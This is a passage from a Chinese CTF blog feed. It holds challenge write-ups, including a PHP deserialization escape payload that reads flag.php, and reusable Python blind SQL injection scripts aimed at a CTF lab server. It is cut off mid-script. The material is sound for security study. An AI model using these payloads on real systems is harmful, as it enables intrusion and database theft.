class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  <span class=\"token comment\">//waf 没有屏蔽重要信息，有数量变化，直接考虑字符逃逸</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Diana</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 创建对象时调用</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Bella</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ico'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 销毁对象时调用</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'a'</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Carol</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 打印对象时调用</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">//flag.php</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string single-quoted-string\">'nice'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Diana</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>本题主要考察 pop 链</p>\n<p>看到最后一行和 waf，就能发现是字符逃逸，六个变三个，每次少三个</p>\n<p>通过_toString () 方法中的 file_get_contents () 函数来读取 flag.php 的源码</p>\n<p>在 Bella 中存在字符串的拼接操作  <code>$c = 'a'.$this-&gt;b</code>  ，让此处的 $b 属性实例化为 Carol 对象即可触发__toString () 方法</p>\n<p>然后让类 Diana 的 password 属性为类 B 的实例化对象，进行序列化</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Bella</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Carol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token operator\">-></span><span class=\"token property\">c</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Diana</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>序列化后的结果</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Diana\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Bella\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Carol\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"c\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>因为 a 和 b 参数是可以 get 的，所以可以用 a 逃掉中间的，再构造 b：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string double-quoted-string\">\";s:8:\"</span>password<span class=\"token string double-quoted-string\">\";O:5:\"</span>Bella<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>b<span class=\"token string double-quoted-string\">\";O:5:\"</span>Carol<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>c<span class=\"token string double-quoted-string\">\";s:8:\"</span>flag<span class=\"token operator\">.</span>php\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>现在需要知道源代码 get a 和 b 参数后序列化是什么样子，借助本地跑一下（<em>其实直接看就能猜出来，直接输入后直接序列化类 Diana，所以只有 username 和 password 两个参数，直接参考上面的序列化的一部分就可以了</em>）：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Diana\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"hah\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"hah\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>再参考俩序列化的结果，找到要替换的部分</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string double-quoted-string\">\";s:8:\"</span>password<span class=\"token string double-quoted-string\">\";s:3:\"</span></pre></td></tr></table></figure><p>因为构造的 b 肯定不是个位数，而是十位数，所以上面的 3 肯定是十位数 xx</p>\n<p>总共 23 位，所以补一位 23 + 1 = 3 * 8</p>\n<p>所以 a 一共要 8 个 Eileen 替换为 Ava</p>\n<p>得到最终 payload：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>a<span class=\"token operator\">=</span>EileenEileenEileenEileenEileenEileenEileenEileen<span class=\"token operator\">&amp;</span>b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string double-quoted-string\">\";s:8:\"</span>password<span class=\"token string double-quoted-string\">\";O:5:\"</span>Bella<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>b<span class=\"token string double-quoted-string\">\";O:5:\"</span>Carol<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>c<span class=\"token string double-quoted-string\">\";s:8:\"</span>flag<span class=\"token operator\">.</span>php\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ps：试了一下有反应但没 flag，最后各种尝试修改 payload，删了一个括号看到了 flag。。（F12）</p>\n<hr>\n<h1 id=\"crypto-tik-tak\"><a class=\"anchor\" href=\"#crypto-tik-tak\">#</a> Crypto--tik-tak</h1>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvZzF3akpIWlZwN2JLRnZ4LnBuZw==\">https://i.loli.net/2021/08/26/g1wjJHZVp7bKFvx.png</span>&quot; alt=&quot;1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>进去之前看到提示，键盘，又对比了一下密码，得到如下信息：</p>\n<ul>\n<li>密码跟键盘有关</li>\n<li>数字都是重叠的</li>\n<li>每个重叠的为一组，不然不会需要 | 来分割</li>\n<li>应该为 12 个字母 3-3-2-4 ，可能为单词拼起来的 flag</li>\n</ul>\n<p>百度一下键盘密码，找到了相关的东西：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvQWRVbXd4VjF1UXBoSkV6LnBuZw==\">https://i.loli.net/2021/08/26/AdUmwxV1uQphJEz.png</span>&quot; alt=&quot;2.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>照着百度方法试着拼了一下，啥都不是</p>\n<p>仔细研究了一下，最后发现这些字母上面的字母能拼成简单的单词，那就基本没跑了！</p>\n<p>成功得到 flag: you-are-so-good</p>\n<hr>\n<h1 id=\"misc-缩小查看更多\"><a class=\"anchor\" href=\"#misc-缩小查看更多\">#</a> MISC-- 缩小查看更多</h1>\n<p>ps：签到略了</p>\n<p>下载了是一张图片，不太会，直接百度了下，图片隐写如何查看更多信息</p>\n<p>然后了解到了 StegSolve，是比较常见的藏信息的方式，抱着试了一下的心态：</p>\n<p>看到了个好玩的</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvYUdtZ0o2T3VId2t5OEZqLnBuZw==\">https://i.loli.net/2021/08/26/aGmgJ6OuHwky8Fj.png</span>&quot; alt=&quot;3.png&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>然后成功找 flag</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvbUNaYVl5Z1JqS0VzVXZTLnBuZw==\">https://i.loli.net/2021/08/26/mCZaYygRjKEsUvS.png</span>&quot; alt=&quot;4.png&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<hr>\n<h1 id=\"misc-仅仅是流量分析\"><a class=\"anchor\" href=\"#misc-仅仅是流量分析\">#</a> MISC-- 仅仅是流量分析？</h1>\n<p>这道题是真不会，于是网上搜了一下后缀，然后找到了教程。。</p>\n<p>BUUCTF-MISC-USB 差不多原题，看着做了下</p>\n<p>先是修压缩包，也没说啥软件，我就拿上次做 upload 题用的 010 editor 试了下，可以修改</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvejNObllVQmZUdWV5NTZRLnBuZw==\">https://i.loli.net/2021/08/26/z3NnYUBfTuey56Q.png</span>&quot; alt=&quot;5.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>找到图片，Stegslove，找到二维码：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvaUFkTVJ2ZTZmeUxHWVpXLnBuZw==\">https://i.loli.net/2021/08/26/iAdMRve6fyLGYZW.png</span>&quot; alt=&quot;6.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvdUlXbnBjOW00WkxPcllkLnBuZw==\">https://i.loli.net/2021/08/26/uIWnpc9m4ZLOrYd.png</span>&quot; alt=&quot;7.png&quot; style=&quot;zoom: 25%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>扫码得到： <code>ci&#123;v3erf_0tygidv2_fc0&#125;</code></p>\n<p>用 010 打开另一个 ftm 文件，搜索关键词 key，找到了 key.pcap</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvU0t6eFJGZEFHazhIZXZyLnBuZw==\">https://i.loli.net/2021/08/26/SKzxRFdAGk8Hevr.png</span>&quot; alt=&quot;8.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p8--&gt;</p>\n<p>然后跟着 wp 做:</p>\n<p><img data-src=\"https://i.loli.net/2021/08/26/Qo8FyOxmAHV9Ejh.png\" alt=\"9.png\">&lt;!--p9--&gt;</p>\n<p>得到内容： <code>xinan</code></p>\n<p>维吉尼亚密码在线解密：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvWGhWMXlUQldTVXA4dXF4LnBuZw==\">https://i.loli.net/2021/08/26/XhV1yTBWSUp8uqx.png</span>&quot; alt=&quot;10.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p10--&gt;</p>\n<p>栅栏密码：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvN0o4UzJxM0VtZXRhNUFXLnBuZw==\">https://i.loli.net/2021/08/26/7J8S2q3Emeta5AW.png</span>&quot; alt=&quot;11.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p11--&gt;</p>\n<hr>\n<h1 id=\"misc-可爱猫猫\"><a class=\"anchor\" href=\"#misc-可爱猫猫\">#</a> MISC-- 可爱猫猫</h1>\n<p>看到两张一样图片，再一看大小 5mb，就想到双图隐写，考虑是盲水印</p>\n<p>然后用 github 上的工具 BlindWaterMark 进行盲水印图片的合成和提取</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python bwm<span class=\"token punctuation\">.</span>py decode cat1<span class=\"token punctuation\">.</span>png cat2<span class=\"token punctuation\">.</span>png cat3<span class=\"token punctuation\">.</span>png <span class=\"token operator\">-</span><span class=\"token operator\">-</span>oldseed</pre></td></tr></table></figure><p>然后得到 cat3.png，打开，模糊能看到 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvc3pNUGR2aUpXZ09qYjVyLnBuZw==\">https://i.loli.net/2021/08/26/szMPdviJWgOjb5r.png</span>&quot; alt=&quot;12.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p12--&gt;</p>\n<p>仔细读能读到，也可用 StegSolve 反转读</p>\n<p blindwatermark1234>flag</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "随笔"
            ]
        },
        {
            "id": "http://example.com/2021/08/17/ctf/web/sql/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/",
            "url": "http://example.com/2021/08/17/ctf/web/sql/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/",
            "title": "ctfweb-各种盲注脚本",
            "date_published": "2021-08-17T13:51:59.954Z",
            "content_html": "<p>以下的几个脚本都是自己写的（有参考别的大佬），代码可能不是最精简，但是还算顺眼</p>\n<p>核心算法都是<strong>二分法</strong>，不推荐时间盲注（速度硬伤）</p>\n<p>脚本 payload 参考题目：[第一章 web 入门] SQL 注入 - 2  / 极客大挑战 finilysql（buuctf）</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1通过post传参的脚本\"><a class=\"anchor\" href=\"#1通过post传参的脚本\">#</a> 1. 通过 post 传参的脚本</h1>\n<hr>\n<p>用的时候修改 post 参数和个数</p>\n<h2 id=\"11-基于异或盲注布尔盲注等\"><a class=\"anchor\" href=\"#11-基于异或盲注布尔盲注等\">#</a> 1.1 基于<strong>异或盲注</strong>，<strong>布尔盲注</strong>等：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    high <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    low <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> high <span class=\"token operator\">></span> low<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or ascii (substr (database (),&#123;i&#125;,1))>&#123;mid&#125;#\"    #查库</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or ascii (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema)='note'),&#123;i&#125;,1))>&#123;mid&#125;#\"   #查表</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or ascii (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name)='fl4g'),&#123;i&#125;,1))>&#123;mid&#125;#\"   #查列</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"1' or ascii(substr((seleCt(flag)from(fl4g)),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">#\"</span></span>   <span class=\"token comment\">#查数据</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token string\">\"pass\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">'qwer'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'u6216'</span> <span class=\"token keyword\">in</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            low <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            high <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>       </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> low <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>low<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"12-基于时间盲注\"><a class=\"anchor\" href=\"#12-基于时间盲注\">#</a> 1.2 基于<strong>时间盲注</strong>：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    high <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    low <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">while</span> high <span class=\"token operator\">></span> low<span class=\"token 